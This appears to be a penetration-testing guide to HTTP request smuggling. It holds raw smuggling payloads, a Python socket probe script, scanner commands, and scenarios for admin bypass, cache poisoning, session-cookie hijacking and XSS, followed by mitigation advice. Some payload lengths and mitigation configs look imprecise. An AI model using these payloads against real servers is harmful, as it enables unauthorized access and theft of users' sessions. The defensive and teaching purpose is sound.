# HTTP Request Smuggling - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Advanced Techniques](#advanced-techniques)
7. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

HTTP Request Smuggling is a technique that exploits discrepancies in how front-end servers (reverse proxies, load balancers) and back-end servers parse HTTP requests. By exploiting these differences, an attacker can "smuggle" a second request within the first, causing the back-end to process it as a separate request.

**Impact**:
- Bypass security controls
- Poison web caches
- Hijack other users' requests
- Steal credentials and session tokens
- Perform unauthorized actions
- XSS and CSRF attacks
- Access to internal APIs

**Prerequisites**:
- Application behind a front-end server (load balancer, CDN, reverse proxy)
- Discrepancy in HTTP parsing between front-end and back-end

---

## Attack Mechanics

### HTTP Request Structure

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13

q=smuggling
```

### Transfer-Encoding vs Content-Length

**Two ways to specify body length**:

1. **Content-Length**: Specifies exact byte count
```http
POST / HTTP/1.1
Content-Length: 13

q=smuggling
```

2. **Transfer-Encoding: chunked**: Body sent in chunks
```http
POST / HTTP/1.1
Transfer-Encoding: chunked

d
q=smuggling
0

```

### Smuggling Variants

**CL.TE (Content-Length → Transfer-Encoding)**:
- Front-end uses Content-Length
- Back-end uses Transfer-Encoding

**TE.CL (Transfer-Encoding → Content-Length)**:
- Front-end uses Transfer-Encoding
- Back-end uses Content-Length

**TE.TE (Transfer-Encoding → Transfer-Encoding)**:
- Both use Transfer-Encoding
- But handle obfuscation differently

---

## Detection Techniques

### 1. CL.TE Detection

**Attack Pattern**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Explanation**:
- Front-end sees Content-Length: 6 (processes "0\r\n\r\nX")
- Back-end sees Transfer-Encoding: chunked (processes "0\r\n\r\n" as end)
- "X" remains in buffer for next request
- If next request times out → CL.TE vulnerable

**Testing**:
```bash
# Send request and wait
# If timeout occurs → vulnerable

curl -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX'
```

### 2. TE.CL Detection

**Attack Pattern**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Explanation**:
- Front-end sees Transfer-Encoding: chunked (processes until "0\r\n\r\n")
- Back-end sees Content-Length: 3 (processes "8\r\n")
- "SMUGGLED\r\n0\r\n\r\n" remains in buffer
- Next request gets prepended with smuggled content
- If server error → TE.CL vulnerable

### 3. TE.TE Detection

**Obfuscation Techniques**:
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked, identity
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: chunked
Transfer-Encoding: x-chunked
Transfer-Encoding:
    chunked
Transfer-Encoding[space]: chunked
```

**Testing**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

12
GPOST / HTTP/1.1

0


```

---

## Scanning Tools

### 1. HTTP Request Smuggler (Burp Extension)

**Installation**:
```
Burp Suite → Extender → BApp Store → HTTP Request Smuggler
```

**Usage**:
1. Proxy traffic through Burp
2. Passive scan automatically detects potential smuggling
3. Active scan: Right-click request → Extensions → Smuggler → Smuggle Probe
4. Results in Dashboard → Issues

**Manual Testing in Repeater**:
```
1. Send request to Repeater
2. Modify with smuggling payload
3. Send twice in quick succession
4. Analyze timing and responses
```

### 2. smuggler.py

```bash
# Clone
git clone https://github.com/defparam/smuggler
cd smuggler

# Basic detection
python3 smuggler.py -u https://target.com/

# Specific endpoint
python3 smuggler.py -u https://target.com/api/endpoint

# With logging
python3 smuggler.py -u https://target.com/ -v

# Test specific technique
python3 smuggler.py -u https://target.com/ -t CL.TE
python3 smuggler.py -u https://target.com/ -t TE.CL
python3 smuggler.py -u https://target.com/ -t TE.TE
```

### 3. h2csmuggler

**For HTTP/2 Smuggling**:
```bash
# Clone
git clone https://github.com/BishopFox/h2csmuggler

# Basic scan
python3 h2csmuggler.py -x https://target.com/

# With custom request
python3 h2csmuggler.py -x https://target.com/ \
  --request-file request.txt

# Brute force detection
python3 h2csmuggler.py -x https://target.com/ --scan-list urls.txt
```

### 4. Manual Testing with curl

**CL.TE Test**:
```bash
# Save to file
cat > clte.txt << 'EOF'
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
EOF

# Send with netcat
nc vulnerable.com 80 < clte.txt
```

**Python Script**:
```python
import socket
import time

def test_clte(host, port=80):
    # CL.TE attack
    attack = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"X"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(attack)

    # Send second request
    time.sleep(1)
    normal = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"\r\n"
    )
    sock.send(normal)

    # Check for timeout or error
    response = sock.recv(4096)
    print(response.decode())
    sock.close()

test_clte("vulnerable.com")
```

---

## Exploitation Scenarios

### Scenario 1: Bypass Front-End Security Controls

**Attack**:
```http
POST /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com


```

**Explanation**:
- Front-end blocks /admin (unauthorized)
- Smuggled request to /admin processed by back-end
- Back-end trusts requests from front-end
- Result: Unauthorized access to /admin

### Scenario 2: Cache Poisoning

**Attack**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
Content-Length: 200

HTTP/1.1 200 OK
Content-Type: text/javascript

alert(document.cookie)
```

**Result**:
- Smuggled request poisons cache
- Next user requesting /static/script.js gets malicious response
- Stored XSS via cache poisoning

### Scenario 3: Request Hijacking

**Attack**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable.com
Content-Length: 300

username=attacker&password=attacker
```

**Explanation**:
- Smuggled POST /login with incomplete Content-Length
- Next user's request appended to smuggled request
- Attacker's response contains victim's credentials/session

**Example**:
```
Smuggled: POST /login\r\nContent-Length: 300\r\n\r\nusername=attacker...
Victim's: GET /profile HTTP/1.1\r\nCookie: session=victim_token
Result: POST /login with victim's cookie in body
```

### Scenario 4: Exploiting Internal APIs

**Attack**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /internal-api/users HTTP/1.1
Host: localhost


```

**Result**:
- Front-end doesn't allow access to /internal-api
- Back-end processes smuggled request
- Internal API accessible from internet

### Scenario 5: XSS via Request Smuggling

**Attack**:
```http
POST /search HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com


```

**Result**:
- Smuggled search request with XSS
- Next user's request gets XSS payload
- Reflected XSS affects random users

---

## Advanced Techniques

### 1. HTTP/2 Request Smuggling

**H2.CL Attack**:
```
HTTP/2 front-end → HTTP/1.1 back-end

HTTP/2 doesn't use Content-Length
Downgraded to HTTP/1.1 with injected Content-Length
```

**Exploit**:
```http
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable.com


```

### 2. HTTP/2 Smuggling via CRLF Injection

**Header Injection**:
```
:method: GET
:path: /
foo: bar\r\n
Content-Length: 10\r\n
\r\n
SMUGGLED
```

### 3. WebSocket Smuggling

**Upgrade Request Smuggling**:
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /chat HTTP/1.1
Host: vulnerable.com
Upgrade: websocket
Connection: Upgrade


```

### 4. Chunked Encoding Variations

**Multiple Chunk Sizes**:
```http
POST / HTTP/1.1
Transfer-Encoding: chunked

5
12345
5
67890
0


```

**Chunk Extension Abuse**:
```http
5;name=value
12345
0


```

### 5. Response Queue Poisoning

**Attack**:
```http
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: vulnerable.com
Foo: bar
```

**Send multiple times**:
- Response queue gets out of sync
- User A gets User B's response
- Steal sensitive data

---

## Prevention & Mitigation

### 1. Disable Connection Reuse

**Apache**:
```apache
# Disable keep-alive
KeepAlive Off
```

**Nginx**:
```nginx
# Disable connection reuse
keepalive_requests 1;
```

### 2. Use HTTP/2 End-to-End

```nginx
# HTTP/2 from client to back-end
# Avoids HTTP/1.1 parsing issues
```

### 3. Normalize Requests

**Front-end Normalization**:
- Reject requests with both CL and TE
- Reject ambiguous requests
- Strict HTTP parsing

```nginx
# Nginx example
if ($http_transfer_encoding ~* chunked) {
    set $has_te 1;
}
if ($http_content_length) {
    set $has_cl 1;
}
if ($has_te$has_cl = "11") {
    return 400;
}
```

### 4. Strict HTTP Parsing

**Configure servers to**:
- Reject malformed requests
- Reject duplicate headers
- Strict RFC compliance

### 5. Use Same HTTP Stack

**Ensure**:
- Front-end and back-end use same HTTP library
- Same version
- Same configuration
- Reduces parsing discrepancies

### 6. Web Application Firewall

**ModSecurity Rules**:
```apache
# Detect CL + TE
SecRule REQUEST_HEADERS:Transfer-Encoding "chunked" \
    "chain,id:1,deny,status:400"
SecRule REQUEST_HEADERS:Content-Length "!@eq 0"
```

### 7. Timeouts

```nginx
# Aggressive timeouts
client_body_timeout 10s;
send_timeout 10s;
```

### 8. Regular Updates

```bash
# Keep all components updated
# Front-end servers (Nginx, Apache, HAProxy)
# Back-end servers (application servers)
# Libraries and frameworks
```

### Security Checklist

- [ ] Use HTTP/2 end-to-end (avoid downgrade)
- [ ] Reject requests with both CL and TE
- [ ] Strict HTTP parsing (RFC compliant)
- [ ] Same HTTP stack for front-end and back-end
- [ ] Disable connection reuse if possible
- [ ] Implement request normalization
- [ ] WAF rules for smuggling detection
- [ ] Regular security updates
- [ ] Monitor for unusual request patterns
- [ ] Log and alert on malformed requests
- [ ] Penetration testing
- [ ] Code review for HTTP handling

---

## Testing Checklist

- [ ] Identify architecture (front-end + back-end)
- [ ] Test for CL.TE variant
- [ ] Test for TE.CL variant
- [ ] Test for TE.TE with obfuscation
- [ ] Test HTTP/2 to HTTP/1.1 downgrade
- [ ] Try bypassing security controls
- [ ] Test cache poisoning
- [ ] Test request hijacking
- [ ] Test internal API access
- [ ] Document all findings
- [ ] Calculate impact

---

**Additional Resources**:
- PortSwigger HTTP Request Smuggling
- James Kettle - HTTP Desync Attacks
- HackTricks - HTTP Request Smuggling
- Burp Suite HTTP Request Smuggler Extension
- defparam/smuggler on GitHub

**Note**: HTTP Request Smuggling is a complex, advanced attack. Always test responsibly on authorized systems.
